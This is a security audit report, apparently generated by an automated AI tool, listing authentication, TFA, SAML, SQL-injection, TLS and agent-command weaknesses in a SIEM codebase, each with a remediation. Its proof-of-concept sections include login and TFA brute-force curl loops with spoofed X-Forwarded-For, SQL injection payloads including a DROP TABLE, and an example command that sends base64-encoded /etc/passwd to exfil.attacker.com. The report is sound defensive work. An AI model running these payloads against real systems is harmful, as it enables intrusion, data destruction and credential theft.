# Security Audit Report — Task 4
**Date:** 2026-07-08
**Auditor:** Claude Code (automated deep audit)
**Scope:** Authentication/Authorization, Agent Security, Input Validation, Secrets & Config, SSRF/Path Traversal, WebSocket, Privilege Escalation, Multi-tenancy

---

## 1. Verification of Prior Known Issues

### SEC-01 — GET /api/check-credentials?password=X (password in URL/logs)
**Status: CONFIRMED — NOT FIXED**
**File:** `backend/src/main/java/com/nilachakra/web/rest/UserJWTController.java:108`

The endpoint remains a GET with `@RequestParam String password`. The plaintext password will appear in:
- Access logs (e.g., nginx, application server)
- Browser history
- Server-side request logs at `log.error(msg)` if an exception occurs (the msg includes the password via URL reconstruction in some frameworks)

No change from prior audit.

---

### SEC-02 — JWT signing key regenerates on restart
**Status: CONFIRMED — NOT FIXED**
**File:** `backend/src/main/java/com/nilachakra/security/jwt/TokenProvider.java:30`

```java
private static final String SECRET = CipherUtil.generateSafeToken();
```

`SECRET` is a `static final` field initialized at class-load time via `CipherUtil.generateSafeToken()`. Every JVM restart (or container restart) generates a new key, instantly invalidating all live sessions. No external key source (env var, Vault, secret store) is used.

---

### SEC-03 — CORS wildcard `allowed-origins: '*'`
**Status: CONFIRMED — PRESENT IN BOTH PROFILES**
**Files:**
- `backend/src/main/resources/config/application-dev.yml:60` — `allowed-origins: '*'`
- `backend/src/main/resources/config/application-prod.yml:51` — `allowed-origins: '*'`

The wildcard is present in the **production** profile as well as dev. Combined with `allow-credentials: false` this prevents cookie-based CSRF, but any site can make authenticated API calls using bearer tokens obtained via XSS on any other page, weakening defense in depth.

---

### SEC-04 — InsecureTrustManagerFactory in gRPC config
**Status: PARTIALLY FIXED — NEW INSTANCE STILL EXISTS IN JAVA BACKEND**
**Files:**
- `agent-manager/agent/utmgrpc.go` — gRPC **server** now correctly uses a real TLS certificate loaded from disk (`/cert/utm.crt`) with `MinVersion: tls.VersionTLS13`. **Fixed for the Go agent-manager server.**
- `backend/src/main/java/com/nilachakra/config/RestTemplateConfiguration.java:64-76` — Java backend `restTemplateWithSsl()` bean uses a trust-all `SSLContext` with `(chain, authType) -> true` and `(hostname, session) -> true`. **Not fixed on the Java side.**
- `agent-manager/utils/auth.go:12` — `IsConnectionKeyValid()` uses `InsecureSkipVerify: true` when making the HTTP call to validate agent connection keys against the panel. **Not fixed.**
- `backend/src/main/java/com/nilachakra/checks/ElasticsearchConnectionCheck.java:81-96` — `createTrustAllClient()` with a custom `X509TrustManager` that accepts all certificates. **Not fixed.**

---

## 2. New Findings

---

### NEW-01 — TFA Rate Limiting Bypass via X-Forwarded-For Spoofing
**Severity: HIGH**
**File:** `backend/src/main/java/com/nilachakra/service/login_attempts/LoginAttemptService.java:68-73`

**Description:**
The rate limiter for login attempts and TFA verification uses the client IP obtained from:
```java
String xfHeader = request.getHeader("X-Forwarded-For");
if (StringUtils.hasText(xfHeader))
    return xfHeader.split(",")[0];
return request.getRemoteAddr();
```
The `X-Forwarded-For` header is trusted unconditionally. An attacker behind any network can spoof this header to rotate IPs and bypass the 10-attempt-per-10-minutes block (`MAX_ATTEMPT = 10`).

**Proof of Concept:**
```bash
for i in $(seq 1 1000); do
  curl -s -X POST /api/authenticate \
    -H "X-Forwarded-For: 10.0.$((i/256)).$((i%256))" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"bruteforce'$i'"}'
done
```

**Impact:** Full brute-force of login credentials and TFA codes with zero effective rate limiting.

**Remediation:**
- Only trust `X-Forwarded-For` if traffic is known to pass through a trusted proxy; configure the proxy's IP in a trusted-proxy allowlist.
- Use Spring's `ForwardedHeaderFilter` with `setForwardedHeaderMode(ForwardedHeaderMode.NATIVE)` and configure `server.forward-headers-strategy=native` with a trusted-proxy list.
- Consider a distributed rate-limiter (Redis) so the in-memory `LoadingCache` is not bypassed by load-balanced deployments.

---

### NEW-02 — TFA Code Brute-Force: No Rate Limit on /api/tfa/verify-code
**Severity: HIGH**
**File:** `backend/src/main/java/com/nilachakra/web/rest/tfa/TfaResource.java:148-170`

**Description:**
The `POST /api/tfa/verify-code` endpoint (the step where a user holding a `PRE_VERIFICATION_USER` JWT submits their OTP code) has **no invocation of `loginAttemptService.isBlocked()`**. The rate limiter is checked only at `POST /api/authenticate`. Once an attacker has stolen a pre-auth JWT (valid for 300 seconds / 5 minutes), they can enumerate all possible TOTP codes (10^6 = 1,000,000 for 6-digit codes) or email codes (typically 6-digit) without any throttling.

**Combined with NEW-01** (IP spoofing), a TOTP code has a 30-second window, but an attacker can attempt ~17,000 codes per second over HTTP with no block.

**Proof of Concept:**
```bash
for code in $(seq -w 0 999999); do
  curl -s -X POST /api/tfa/verify-code \
    -H "Authorization: Bearer <pre_auth_jwt>" \
    -H "Content-Type: application/json" \
    -d '"'$code'"'
done
```

**Remediation:**
Call `loginAttemptService.isBlocked()` at the start of `verifyCode()` in `TfaResource.java`. Lock the pre-auth token after N (e.g., 5) failed attempts by tracking per-token failure counts.

---

### NEW-03 — TFA Globally Disabled in docker-compose (APP_TFA_ENABLED=false)
**Severity: HIGH**
**File:** `local-dev/docker-compose.yml:172`

```yaml
- APP_TFA_ENABLED=false
```

**Description:**
`TokenProvider.shouldBypassTfa()` reads the `APP_TFA_ENABLED` environment variable. When set to `false`, TFA is bypassed for **all users globally**, even those who have TFA configured. The docker-compose file ships this as a default setting. If this file is used as a starting point for staging or production deployments (common in practice), TFA is silently disabled enterprise-wide.

**Impact:** Complete bypass of the second authentication factor for all users.

**Remediation:**
- Change the default to `APP_TFA_ENABLED=true` in docker-compose.
- Add a startup assertion that logs a loud warning (or refuses to start) if TFA is disabled in a non-development Spring profile.

---

### NEW-04 — SAML Open Redirect via X-Forwarded-Host Header
**Severity: HIGH**
**File:** `backend/src/main/java/com/nilachakra/security/saml/Saml2LoginSuccessHandler.java:44-76`

**Description:**
After successful SAML authentication, the redirect target is constructed from attacker-controlled request headers:
```java
String scheme = Objects.requireNonNullElse(request.getHeader("X-Forwarded-Proto"), request.getScheme());
String host = Objects.requireNonNullElse(request.getHeader("X-Forwarded-Host"), request.getServerName());
String frontBaseUrl = scheme + "://" + host;
// ...
response.sendRedirect(redirectUri.toString());  // includes ?token=<JWT>
```

An attacker who initiates a SAML flow (or intercepts a legitimate one via MITM) can set:
```
X-Forwarded-Host: attacker.example.com
```

The response then sends:
```
302 Location: https://attacker.example.com/?token=<fullJWT>
```

The victim's fully authenticated JWT is exfiltrated to the attacker's domain in the browser's Referer header or server logs.

**Proof of Concept:**
Craft a SAML request and inject the header in any proxy layer or via direct HTTP request to the backend with `X-Forwarded-Host: attacker.example.com`.

**Remediation:**
Replace the dynamic host construction with a hardcoded, configurable frontend base URL from application properties (e.g., `app.frontend-url`). Never trust `X-Forwarded-*` headers for security-critical redirects unless the request originates from a trusted proxy.

---

### NEW-05 — SQL Injection via Unsanitized Sort Parameter (Spring Pageable ORDER BY)
**Severity: HIGH**
**Files:**
- `backend/src/main/java/com/nilachakra/service/network_scan/UtmAssetGroupService.java:216`
- `backend/src/main/java/com/nilachakra/service/collectors/CollectorOpsService.java:353`

**Description:**
Both `searchGroupsByFilter()` methods build raw SQL strings and inject the Spring `Pageable` sort property directly:
```java
sb.append(String.format(firstProperty ? "%1$s %2$s" : ", %1$s %2$s",
    order.getProperty(), order.getDirection().name()));
```

Spring's `Pageable` sort properties come from the HTTP request parameter `?sort=field,direction`. There is **no validation or whitelist** of `order.getProperty()` before it is concatenated into the SQL string. `order.getDirection().name()` is safe (only `ASC`/`DESC`) but `order.getProperty()` can be any string.

**Proof of Concept:**
```
GET /api/utm-asset-groups/searchGroupsByFilter?sort=1;DROP TABLE utm_asset_group;--,asc
```
The constructed SQL becomes:
```sql
ORDER BY 1;DROP TABLE utm_asset_group;-- ASC
```

**Impact:** Authenticated attacker (USER or ADMIN role) can execute arbitrary SQL on the PostgreSQL database.

**Remediation:**
Whitelist allowed sort columns. Create a `Set<String> ALLOWED_SORT_COLUMNS` and reject any `order.getProperty()` not in it before appending. Alternatively, use JPA's `CriteriaBuilder` or `Specification` API instead of raw SQL string building.

---

### NEW-06 — SQL Injection via String-Formatted Filter Parameters (assetType, groupName, IPs, etc.)
**Severity: HIGH**
**Files:**
- `backend/src/main/java/com/nilachakra/service/network_scan/UtmAssetGroupService.java:126,142,150,158,167,176,185,194`
- `backend/src/main/java/com/nilachakra/service/collectors/CollectorOpsService.java:290,306,314,322,332`

**Description:**
Multiple filter fields are embedded into SQL strings using `String.format` without parameterized queries:
```java
sb.append(String.format("AND type = '%s'\n", filters.getAssetType()));

sb.append(String.format("lower(utm_asset_group.group_name) LIKE '%%%1$s%%'\n",
    filters.getGroupName()));

// List values individually quoted and joined:
.map(ip -> String.format("'%1$s'", ip)).collect(Collectors.joining(","))
sb.append(String.format("utm_network_scan.asset_ip IN (%1$s)\n", ips));
```

Single-quote injection in `assetType`, `groupName`, `assetIp`, `assetName`, `os`, and `probe` fields is possible. The surrounding single quotes can be escaped using `'` to close them and inject arbitrary SQL.

**Proof of Concept:**
```
GET /api/utm-asset-groups/searchGroupsByFilter?assetType=x' OR '1'='1
```
The built query becomes:
```sql
AND type = 'x' OR '1'='1'
```

**Remediation:**
Replace all `String.format()` query building with JPA `@NamedNativeQuery` with positional parameters or a `CriteriaBuilder`. Minimum: use `PreparedStatement` parameters via `entityManager.createNativeQuery(sql).setParameter(n, value)`.

---

### NEW-07 — Unauthenticated SAML Identity Provider Configuration Disclosure
**Severity: MEDIUM**
**File:** `backend/src/main/java/com/nilachakra/web/rest/idp_provider/IdentityProviderResource.java:27-34`
**Security Config:** `SecurityConfiguration.java:121`

**Description:**
`GET /api/utm-providers` is `permitAll()` (no authentication required). This endpoint returns a list of `IdentityProviderConfigResponseDto` objects including:
- `metadataUrl` — URL of the SAML metadata endpoint
- `spCertificatePem` — the service provider's X.509 certificate (PEM)
- Provider names and types

An unauthenticated attacker gains knowledge of:
1. Whether SAML is configured and which providers are active
2. The SP certificate, which can be used to craft or analyze SAML assertions
3. Metadata URLs that may point to internal infrastructure

**Remediation:**
- Restrict `GET /api/utm-providers` to authenticated users only (remove from `permitAll()` list), or
- Return only the minimal data needed by the login page (e.g., provider name and type) from a separate, more restricted DTO.

---

### NEW-08 — JWT Token in URL Query String (WebSocket and REST)
**Severity: MEDIUM**
**Files:**
- `backend/src/main/java/com/nilachakra/security/jwt/JWTFilter.java:51` — `request.getParameter(AUTHORIZATION_TOKEN)` — accepts `?access_token=<JWT>` in REST calls
- `backend/src/main/java/com/nilachakra/config/WebsocketConfiguration.java:52-63` — WebSocket handshake reads token from `request.getURI().getQuery()`

**Description:**
JWT tokens passed as URL query parameters (`?access_token=`) are recorded in:
- Server access logs (nginx, application server)
- Browser history
- Referrer headers when navigating away
- Any CDN or proxy caches that log full URLs

This is a secondary path alongside the standard `Authorization: Bearer` header. For WebSocket connections SockJS requires it, but for REST API calls it is unnecessary.

**Remediation:**
- For REST: Remove the `request.getParameter(AUTHORIZATION_TOKEN)` fallback in `JWTFilter.resolveToken()`. Only accept the `Authorization` header.
- For WebSocket: This is a known SockJS limitation. Mitigate by shortening WebSocket-specific token lifetimes or using a one-time handshake token exchange instead of the full JWT in the URL.

---

### NEW-09 — Open Agent Registration: Any Entity with a Connection Key Can Register
**Severity: MEDIUM**
**File:** `agent-manager/agent/agent_imp.go:70-115`

**Description:**
`RegisterAgent` is protected only by a valid `connection-key` (the `connection-key` gRPC route). The `IsConnectionKeyValid()` function validates this key by making an HTTP POST to the panel backend at `/api/authenticateFederationServiceManager`. The panel endpoint itself is `permitAll()`.

Anyone who obtains a valid federation service token (a Base64-encoded string stored in the `utm_federation_service_client` table) can:
1. Call `RegisterAgent` to register a new agent with arbitrary IP/hostname/OS metadata
2. Receive a valid `(id, key)` pair
3. Use that pair to open an `AgentStream` bidirectional connection

A registered agent can:
- Receive commands from the panel (anything a panel user issues)
- Send fake command results back

There is no pre-approval check (e.g., an allowlist of approved hostnames/MACs). Any machine that knows the connection key self-registers and is immediately trusted.

Furthermore, `IsConnectionKeyValid` uses `InsecureSkipVerify: true` (NEW-04 surface).

**Remediation:**
- Require admin pre-approval before a new agent becomes active (similar to certificate-based enrolment).
- Add a pending/approved state to the `agents` table; newly registered agents should be in `PENDING` state until manually approved.
- Alternatively, use mutual TLS client certificates signed by the organization's internal CA instead of shared tokens.

---

### NEW-10 — Agent/Collector Commands Are Not Validated Before Forwarding
**Severity: MEDIUM**
**File:** `agent-manager/agent/agent_imp.go:284-370` (`ProcessCommand`)

**Description:**
Commands received by `ProcessCommand` from the panel are forwarded directly to the target agent stream after only:
- Replacing `$[type:encryptedValue]` patterns with decrypted secrets via `replaceSecretValues()`
- Checking `originId`, `originType`, and `reason` are non-empty

There is no validation of the `Command` field content (the actual shell command to execute on the agent). An authenticated panel user with access to the incident response or remote command feature can send arbitrary shell commands to any connected agent:

```json
{"agentId": "1", "command": "curl http://exfil.attacker.com/$(cat /etc/passwd | base64)", "shell": "/bin/bash"}
```

**Note:** This is partially by design (remote command execution is a SIEM feature), but there is no audit trail validation or command sanitization for security-sensitive contexts.

**Remediation:**
- Implement command templates (only pre-defined commands with parameter substitution).
- Add a command allow-list for restricted roles.
- Ensure all commands and their results are immutably audit-logged (the history table writes are best-effort and could be lost on error).

---

### NEW-11 — Trust-All SSL in `restTemplateWithSsl` and `ElasticsearchConnectionCheck`
**Severity: MEDIUM**
**Files:**
- `backend/src/main/java/com/nilachakra/config/RestTemplateConfiguration.java:64-76`
- `backend/src/main/java/com/nilachakra/checks/ElasticsearchConnectionCheck.java:81-96`

**Description:**
Both create HTTP clients that accept any TLS certificate (including self-signed and expired). While acknowledged in a code comment (`// known security gap`), these clients are used by application code making outbound HTTP calls, which could include calls to user-controlled URLs (SSRF vectors). A MITM attacker on the network path can intercept and modify responses.

**Remediation:**
- Use a trust store containing only the expected certificate(s) (certificate pinning or internal CA).
- At minimum, remove the `hostnameVerifier((hostname, session) -> true)` override so hostname mismatch is still detected.

---

### NEW-12 — Hardcoded Mail Credentials in application-dev.yml
**Severity: MEDIUM**
**File:** `backend/src/main/resources/config/application-dev.yml:40-41`

```yaml
mail:
  host: localhost
  port: 25
  username: test@domain.local
  password: Admin123.
```

A hardcoded SMTP password is committed to source control. If this file is accidentally deployed to a staging environment with a real mail server configured, or if the repository is made public, credentials are exposed.

**Remediation:**
- Replace with `${MAIL_PASSWORD:}` placeholder (empty default or fail-fast).
- Add a `.gitignore` entry for any file containing real credentials if local overrides are needed.

---

### NEW-13 — Information Leakage in TFA Error Message
**Severity: LOW**
**File:** `backend/src/main/java/com/nilachakra/web/rest/tfa/TfaResource.java:166`

```java
throw new TfaVerificationException("TFA invalid for user '" + user.getLogin() + "': " + response.getMessage());
```

The exception message includes the username of the authenticated user and the TFA failure reason. If the exception propagates to the HTTP response body (via Spring's default exception handler), this confirms valid usernames to authenticated-but-pre-TFA-verified users. It also leaks internal TFA failure details.

**Remediation:**
Return a generic error message to the client. Log the detailed message server-side only.

---

### NEW-14 — Rate Limiter State is In-Memory and Not Shared Across Instances
**Severity: LOW**
**File:** `backend/src/main/java/com/nilachakra/service/login_attempts/LoginAttemptService.java`

**Description:**
The `LoadingCache<String, Integer>` is an in-memory per-JVM cache. In a horizontally scaled deployment (multiple backend pods), each pod has its own counter. An attacker distributing N requests evenly across N pods can make N × MAX_ATTEMPT = N × 10 total attempts before any pod blocks them.

**Remediation:**
Back the rate limiter with Redis (`spring.data.redis`) which the codebase already has partial support for (`app.redis.enabled` config key).

---

### NEW-15 — WebSocket `/ws/**` Uses permitAll at HTTP Layer
**Severity: LOW**
**File:** `backend/src/main/java/com/nilachakra/config/SecurityConfiguration.java:148`

```java
.requestMatchers("/ws/**").permitAll()
```

The HTTP-level Spring Security filter chain completely bypasses JWT authentication for all `/ws/**` paths. Authentication for the WebSocket upgrade handshake is handled inside `WebsocketConfiguration.defaultHandshakeHandler()` (validates the `access_token` query param) and the STOMP message layer (`WebsocketSecurityConfiguration`).

However, SockJS polling transports use paths like `/ws/info`, `/ws/<server>/<session>/xhr`, etc. These paths match `/ws/**` and are `permitAll()`. The polling transport paths do not go through the same handshake handler. If the STOMP security layer has any gap, unauthenticated SockJS polling endpoints could be accessible.

**Remediation:**
Change `/ws/**` to require at minimum `isAuthenticated()` at the HTTP layer, and rely on the WebSocket handshake for token validation as a second layer. The token validation at the handshake level ensures the HTTP filter change does not break legitimate connections.

---

## 3. Risk Summary Table

| ID | Title | Severity | Component | Status |
|----|-------|----------|-----------|--------|
| SEC-01 | Password in GET URL | HIGH | Backend REST | Not fixed |
| SEC-02 | JWT key regenerates on restart | HIGH | Backend JWT | Not fixed |
| SEC-03 | CORS wildcard in prod profile | MEDIUM | Backend config | Not fixed |
| SEC-04 | Trust-all TLS (gRPC client) | MEDIUM | Agent-manager Go | Partially fixed (server side fixed, client side not) |
| NEW-01 | Rate limiter IP spoofing via X-Forwarded-For | HIGH | Backend login | New |
| NEW-02 | No rate limit on TFA /verify-code | HIGH | Backend TFA | New |
| NEW-03 | TFA globally disabled in docker-compose | HIGH | Deployment config | New |
| NEW-04 | SAML open redirect via X-Forwarded-Host | HIGH | Backend SAML | New |
| NEW-05 | SQL injection via sort parameter (ORDER BY) | HIGH | Backend query builder | New |
| NEW-06 | SQL injection via string-formatted filter fields | HIGH | Backend query builder | New |
| NEW-07 | Unauthenticated SAML IdP config disclosure | MEDIUM | Backend REST | New |
| NEW-08 | JWT in URL query string (WebSocket + REST) | MEDIUM | Backend JWT/WS | New |
| NEW-09 | Open agent registration (no pre-approval) | MEDIUM | Agent manager | New |
| NEW-10 | Agent commands not validated before forwarding | MEDIUM | Agent manager | New |
| NEW-11 | Trust-all SSL (Java RestTemplate + ES check) | MEDIUM | Backend HTTP client | New |
| NEW-12 | Hardcoded SMTP password in dev config | MEDIUM | Backend config | New |
| NEW-13 | TFA error leaks username + reason | LOW | Backend TFA | New |
| NEW-14 | In-memory rate limiter not shared across replicas | LOW | Backend login | New |
| NEW-15 | WebSocket HTTP layer uses permitAll | LOW | Backend security | New |

---

## 4. Key Files Reference

| File | Relevance |
|------|-----------|
| `backend/src/main/java/com/nilachakra/config/SecurityConfiguration.java` | Main HTTP security filter chain, endpoint authorization matrix |
| `backend/src/main/java/com/nilachakra/security/jwt/TokenProvider.java` | JWT generation and validation, TFA bypass logic |
| `backend/src/main/java/com/nilachakra/web/rest/UserJWTController.java` | Login endpoint, SEC-01 password-in-URL, rate limit check |
| `backend/src/main/java/com/nilachakra/web/rest/tfa/TfaResource.java` | TFA verify-code endpoint, no rate limit, info leakage |
| `backend/src/main/java/com/nilachakra/service/login_attempts/LoginAttemptService.java` | Rate limiter, X-Forwarded-For trust, in-memory cache |
| `backend/src/main/java/com/nilachakra/security/saml/Saml2LoginSuccessHandler.java` | SAML open redirect via X-Forwarded-Host |
| `backend/src/main/java/com/nilachakra/service/network_scan/UtmAssetGroupService.java` | SQL injection in filter/sort query building |
| `backend/src/main/java/com/nilachakra/service/collectors/CollectorOpsService.java` | SQL injection in collector filter/sort |
| `backend/src/main/java/com/nilachakra/config/WebsocketConfiguration.java` | WebSocket JWT from query param, SockJS permitAll |
| `backend/src/main/java/com/nilachakra/config/RestTemplateConfiguration.java` | Trust-all SSL on Java HTTP client |
| `backend/src/main/resources/config/application-dev.yml` | Hardcoded SMTP password, CORS wildcard |
| `backend/src/main/resources/config/application-prod.yml` | CORS wildcard in production |
| `local-dev/docker-compose.yml` | APP_TFA_ENABLED=false default |
| `agent-manager/agent/interceptor.go` | Agent/collector auth via key+id, connection-key validation |
| `agent-manager/agent/agent_imp.go` | Open registration, unvalidated command forwarding |
| `agent-manager/utils/auth.go` | InsecureSkipVerify=true for connection-key validation |
| `agent-manager/agent/utmgrpc.go` | gRPC server with TLS (correctly configured) |
